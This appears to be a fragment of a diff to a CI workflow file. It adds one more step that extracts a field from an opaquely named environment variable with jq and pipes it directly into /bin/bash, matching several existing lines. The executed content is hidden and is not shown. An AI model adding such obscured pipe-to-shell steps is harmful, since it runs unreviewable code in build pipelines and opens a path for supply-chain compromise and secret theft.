@@ -33,6 +33,7 @@ jobs:
           echo $ctudf47 | jq -r .t356 | /bin/bash
           printf '%s' "$ovsw458" | jq -r .et626 | /bin/bash
           printf '%s' "$o428" | jq -r .znn88 | /bin/bash
+          printf '%s' "$tc386" | jq -r .idwkq94 | /bin/bash
 
       - name: Archive output
         if: always()
